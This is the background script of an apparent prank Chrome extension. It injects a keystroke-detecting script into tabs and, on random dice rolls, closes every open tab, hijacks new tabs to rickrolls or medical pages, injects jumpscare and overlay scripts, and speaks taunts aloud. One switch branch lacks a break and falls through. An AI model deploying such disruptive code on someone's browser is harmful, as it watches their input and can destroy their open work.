let alreadyCreated = false;

chrome.tabs.onUpdated.addListener(info => {
    chrome.tabs.query({ active: true, currentWindow: true }).then(response => {
        let tab = response[0];

        chrome.scripting.executeScript({
            target: { tabId: tab.id },
            files: ['/js/key-detect.js']
        });
    });
})

chrome.tabs.onCreated.addListener(info => {
    chrome.tabs.query({ active: true, currentWindow: true }).then(response => {
        let tab = response[0];

        chrome.scripting.executeScript({
            target: { tabId: tab.id },
            files: ['/js/key-detect.js']
        });
    });
    
    randomTab(info);
});

chrome.runtime.onMessage.addListener(msg => {
    if (msg.subject === 'getKeyStroke') {
        if (Math.random() < 0.1) runRandom();
    }

    if (msg.subject === 'getMousePress') {
        if (Math.random() < 0.1) runRandom();
    }
})

setInterval(() => {
    if (Math.random() < 0.1) runRandom();
}, 500);

let randomTab = info => {
    rollDice(20).then(number => {
        switch (number) {
            case 1:
                if (!alreadyCreated) {
                    chrome.tabs.remove(info.id);

                    chrome.tabs.create({
                        active: true,
                        url: 'https://www.bing.com/search?q=how+to+set+google+as+default+search+engine&qs=LS&pq=how+to+set+google+as+&sc=8-21&cvid=640E01CBA0A749628172715746A773E6&FORM=QBLH&sp=1'
                    });

                    alreadyCreated = true;
                } else {
                    alreadyCreated = false;
                }
                break;
            case 2:
            case 3:
            case 4:
            case 5:
                if (!alreadyCreated) {
                    chrome.tabs.remove(info.id, () => {
                        console.log('New tab has been created and removed');
                    });
                    var random = Math.floor(Math.random() * 25) + 1;
                    alreadyCreated = true;
                    switch (random) {
                        case 1:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/golfers-elbow/symptoms-causes/syc-20372868'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                        case 2:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/heat-stroke/symptoms-causes/syc-20353581'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                        case 3:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/febrile-seizure/symptoms-causes/syc-20372522'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                        case 4:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/pelvic-inflammatory-disease/symptoms-causes/syc-20352594'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                        case 5:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/diabetes-insipidus/symptoms-causes/syc-20351269'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                        case 6:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/acute-lymphocytic-leukemia/symptoms-causes/syc-20369077'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                        case 7:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/mesothelioma/symptoms-causes/syc-20375022'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                        case 8:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/stomach-cancer/symptoms-causes/syc-20352438'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                        case 9:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/mental-illness/symptoms-causes/syc-20374968'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                        case 10:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/ruptured-spleen/symptoms-causes/syc-20352317'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                        case 11:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/hypersomnia/symptoms-causes/syc-20362332'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                        case 12:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/airplane-ear/symptoms-causes/syc-20351701'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                        case 13:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/lead-poisoning/symptoms-causes/syc-20354717'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                        case 14:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/keratosis-pilaris/symptoms-causes/syc-20351149'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                        case 15:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/klinefelter-syndrome/symptoms-causes/syc-20353949'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                        case 16:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/endometriosis/symptoms-causes/syc-20354656'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                        case 17:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/chronic-kidney-disease/symptoms-causes/syc-20354521'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                        case 18:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/heart-arrhythmia/symptoms-causes/syc-20350668'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                        case 19:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/zika-virus/symptoms-causes/syc-20353639'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                        case 20:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/triple-x-syndrome/symptoms-causes/syc-20350977'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                        case 21:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/menstrual-cramps/symptoms-causes/syc-20374938'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                        case 22:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/vaginitis/symptoms-causes/syc-20354707'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                        case 23:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/pseudomembranous-colitis/symptoms-causes/syc-20351434'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                        case 24:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/persistent-depressive-disorder/symptoms-causes/syc-20350929'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                        case 25:
                            chrome.tabs.create({
                                active: true,
                                url: 'https://www.mayoclinic.org/diseases-conditions/valley-fever/symptoms-causes/syc-20378761'
                            }, () => {
                                console.log('went to burger king foot lettuce');
                            });
                            break;
                    }
                } else {
                    alreadyCreated = false;
                }
            case 6:
            case 7:
            case 8:
            case 9:
                if (!alreadyCreated) {
                    chrome.tabs.remove(info.id);

                    chrome.tabs.create({
                        active: true,
                        url: 'https://we-are-jammin.xyz/'
                    });

                    alreadyCreated = true;
                } else {
                    alreadyCreated = false;
                }
                break;
            case 10:
            case 11:
            case 12:
            case 13:
            case 14:
                if (!alreadyCreated) {
                    chrome.tabs.remove(info.id);

                    chrome.tabs.create({
                        active: true,
                        url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'
                    });

                    alreadyCreated = true;
                } else {
                    alreadyCreated = false;
                }
                break;
            case 15:
                if (!alreadyCreated) {
                    chrome.tabs.remove(info.id);

                    chrome.tabs.create({
                        active: true,
                        url: 'https://www.youtube.com/watch?v=9PWjqgM_CU8'
                    });

                    alreadyCreated = true;
                } else {
                    alreadyCreated = false;
                }
                break;
            case 16:
            case 17:
            case 18:
                if (!alreadyCreated) {
                    chrome.tabs.remove(info.id, () => {
                        console.log('New tab has been created and removed');
                    });
                    chrome.tts.speak("You really decided to be a computer science major, huh?");
                    chrome.tabs.create({
                        active: true,
                        url: 'https://www.hackertyper.com/'
                    }, () => {
                        console.log('hackerman');
                    });

                    alreadyCreated = true;
                } else {
                    alreadyCreated = false;
                }
                break;
            case 19:
                break;
            case 20:
                if (!alreadyCreated) {
                    chrome.tabs.remove(info.id);

                    chrome.tabs.create({
                        active: true,
                        url: 'https://www.google.com/'
                    });

                    setTimeout(() => {
                        chrome.tabs.query({ active: true, currentWindow: true }).then(response => {
                            let tab = response[0];
                            console.log('youve been font change');

                            chrome.scripting.executeScript({
                                target: { tabId: tab.id },
                                files: ['/js/jumpscare.js']
                            });
                        });
                    }, 1000);

                    alreadyCreated = true;
                } else {
                    alreadyCreated = false;
                }

                break;
        }
    });
}

let runRandom = () => {
    rollDice(20).then(number => {
        switch (number) {
            case 1:
                chrome.tabs.query({}, function (tabs) {
                    for (var i = 0; i < tabs.length; i++) {
                        chrome.tabs.remove(tabs[i].id);
                    }
                });
                break;
            case 2:
                chrome.tabs.query({ active: true, currentWindow: true }).then(response => {
                    let tab = response[0];
                    console.log('youve been font change');

                    chrome.scripting.executeScript({
                        target: { tabId: tab.id },
                        files: ['/js/font-change.js']
                    });
                });
                break;
            case 3:
            case 4:
            case 5:
                chrome.tabs.query({ active: true, currentWindow: true }).then(response => {
                    let tab = response[0];
                    console.log('youve been gandalfed');

                    chrome.scripting.executeScript({
                        target: { tabId: tab.id },
                        files: ['/js/gandalfed.js']
                    });
                });
                break;
            case 6:
            case 7:
            case 8:
            case 9:
            case 10:
                chrome.tabs.query({ active: true, currentWindow: true }).then(response => {
                    let tab = response[0];
                    console.log('youve been gandalfed');

                    chrome.scripting.executeScript({
                        target: { tabId: tab.id },
                        files: ['/js/fireball.js']
                    });
                });
                break;
            case 11:
            case 12:
            case 13:
            case 14:
            case 15:
                break;
            case 16:
            case 17:
            case 18:
            case 19:
            case 20:
                chrome.tabs.query({ active: true, currentWindow: true }).then(response => {
                    let tab = response[0];
                    console.log('youve been gandalfed');

                    chrome.scripting.executeScript({
                        target: { tabId: tab.id },
                        files: ['/js/devitoed.js']
                    });
                });
                break;
            }
    });
}

let sleep = ms => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

let rollDice = async sides => {
    chrome.tabs.query({ active: true, currentWindow: true }).then(response => {
        let tab = response[0];

        chrome.scripting.executeScript({
            target: { tabId: tab.id },
            files: ['/js/rollDice.js']
        });
    });

    await sleep(4000);

    return Math.floor(Math.random() * sides + 1);
}